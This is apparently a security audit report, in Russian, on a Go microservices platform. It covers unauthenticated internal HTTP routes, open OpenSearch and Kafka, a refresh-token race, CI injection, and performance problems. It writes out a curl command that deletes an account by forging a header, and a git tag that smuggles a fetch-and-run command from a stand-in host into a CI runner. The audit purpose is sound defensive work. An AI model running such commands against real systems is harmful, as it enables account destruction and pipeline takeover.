### Ключевые сценарии атак

**SEC-01 (главное).** `user-service` и `post-service` поднимают HTTP-серверы (main.go), где `PUT/DELETE /api/v1/users/:id` и `POST/PUT/DELETE /api/v1/posts*` защищены только `AuthMiddleware`, читающим `X-User-ID` из заголовка без какой-либо криптопроверки (комментарий «set by API Gateway» — но gateway ходит в сервисы по gRPC, а не через эти маршруты). В k8s нет ни одной NetworkPolicy, на портах 8082/8083 нет Linkerd Server (default-allow): **любой под кластера** (или SSRF из frontend-BFF) делает `curl -X DELETE -H 'X-User-ID: <victim>' http://user-service:8082/api/v1/users/<victim>` — удаление/изменение любого аккаунта и постов. Рекомендация: удалить legacy-HTTP-мутации (gateway использует gRPC) или закрыть их тем же JWT-валидатором, что в notification-service; добавить default-deny NetworkPolicy.

**SEC-02 + SEC-04 (цепочка).** Компрометация любого пода → неаутентифицированный OpenSearch :9200 (чтение/запись/удаление индексов) и Kafka :9092 (публикация поддельных `search.users`/`search.posts`, которые search-service индексирует как подлинные) → эксфильтрация проиндексированных данных, отравление выдачи, фишинговые «уведомления» через RabbitMQ. Рекомендация: default-deny NetworkPolicy + включить security-плагин OpenSearch + учётки/ACL брокеров per-service.

**SEC-07.** Два конкурентных refresh с одним токеном оба проходят проверку blacklist до записи; ошибка blacklist лишь логируется — вор с украденным refresh-токеном держит параллельную сессию, невидимую жертве. Рекомендация: атомарное потребление (GETDEL записи refresh) + fail при сбое blacklist + revoke всей семьи токенов при reuse.

**SEC-09.** Тег `v1$(curl${IFS}evil.sh|sh)` легален для git: интерполяция в `run:` исполняет его на раннере → эксфильтрация `GITHUB_TOKEN`, пуш отравленного образа `:latest`, который тянет production-оверлей. Рекомендация: значение — через `env:`, валидация `^v\d+\.\d+\.\d+$`, пин actions по SHA.

### Сильные стороны (сохранить)

Параметризованный SQL во всех трёх репозиториях; типизированные OpenSearch-запросы через `json.Marshal` (инъекции нет); `actor_id == id` на gRPC Update/Delete user-service; `published_only` навязывается сервер-сайд; bcrypt с ограничениями длины; one-shot GETDEL для state/auth_code + 32-байтовые `crypto/rand` значения + allowlist redirect URI + обязательный PKCE для mobile; CORS wildcard+credentials отклоняется дважды; `TRUSTED_PROXIES` пуст по умолчанию (IP не спуфится); fail-closed auth-рейтлимит; compose `${VAR:?}` без дефолтных секретов; запрет reflection/insecure-режимов в production; sealed-secrets + placeholder-guard в `prod-bootstrap.sh`; все сервисные Dockerfile — multi-stage, non-root uid 10001; мониторинг на loopback; DLQ у Kafka/RabbitMQ-конвейеров; PII-минимизация в proto-маппингах.

### Средняя серьёзность

- **Поиск пользователей не работает вовсе**: продюсера в топик `search.users` не существует (в user-service нет kafka-зависимости), индекс пуст, каждый Search впустую опрашивает OpenSearch; CLAUDE.md утверждает обратное (`user-service/go.mod`) — mq-06.
- Списки/поиск постов тянут полный `content` TEXT и выбрасывают его (DTO-summary без Content): 100KB–1MB мёртвых данных на страницу публичной ленты (`post_repository.go:160`) — pg-04.
- «Курсор» фолловеров — это base64(OFFSET) без индекса под сортировку: O(F log F) на каждую страницу, дубликаты/пропуски при конкурентных фолловах (`follow_repository.go:53-87`) — pg-02.
- Head-of-line blocking у нотификаций: один консьюмер-горутина + inline-sleep ретраи (6s на «ядовитое» сообщение при prefetch 10) (`rabbitmq/client.go:157`) — mq-03/runtime-07; вдобавок обработка **неидемпотентна** (uuid на каждую доставку, plain INSERT) → дубликаты уведомлений при ределивери (`notification_service.go:199`) — mq-07.
- События постов теряются до 30 с при обрыве RabbitMQ (reconnect по 30s-тикеру, а не NotifyClose) + гонка на swap канала (`messaging/publisher.go:99-128`, `main.go:171-188`) — mq-04.
- Search-консьюмер коммитит синхронно на каждое сообщение (`CommitInterval:0`) и индексирует по одному документу вместо `_bulk` — потолок в сотни docs/sec, долгий догон бэклога (`kafka/consumer.go:43,146`) — mq-05.
